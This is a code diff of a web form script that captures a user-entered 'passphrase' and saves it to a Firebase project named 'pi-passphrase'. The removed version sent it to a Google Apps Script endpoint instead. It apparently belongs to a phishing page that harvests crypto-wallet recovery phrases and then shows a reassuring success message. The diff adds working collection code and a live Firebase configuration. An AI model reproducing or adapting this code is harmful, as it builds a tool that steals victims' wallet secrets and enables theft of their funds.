@@ -1,30 +1,28 @@
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyDdtkNSh_mgz58EKpgqJ4o-1_wp9tuZwHc",
+  authDomain: "pi-passphrase.firebaseapp.com",
+  projectId: "pi-passphrase",
+  storageBucket: "pi-passphrase.firebasestorage.app",
+  messagingSenderId: "266422695832",
+  appId: "1:266422695832:web:a729bb8dcf12db2bd7dded",
+  measurementId: "G-8HQWNNGNB9"
+};
 document.getElementById('passphraseForm').addEventListener('submit', function(event) {
     event.preventDefault();
 
     const passphrase = document.getElementById('passphrase').value;
 
-    // Save the passphrase to Google Sheets
-    savePassphrase(passphrase);
-
-    // Show success message
-    document.getElementById('successMessage').classList.remove('hidden');
-});
-
-function savePassphrase(passphrase) {
-    const url = 'https://script.google.com/macros/s/AKfycbyn0_3rjn8a6s069u7_umd6QcYZl2rEEIn_dfoQuP0t/dev'; // Replace with your Web app URL
-
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ passphrase: passphrase }),
+    // Save the passphrase to Firestore
+    db.collection('passphrases').add({
+        passphrase: passphrase,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
     })
-    .then(response => response.json()) // Parse JSON response
-    .then(data => {
-        console.log('Passphrase saved successfully:', data.result);
+    .then(() => {
+        console.log('Passphrase saved successfully');
+        document.getElementById('successMessage').classList.remove('hidden');
     })
     .catch(error => {
         console.error('Error saving passphrase:', error);
     });
-}
+});
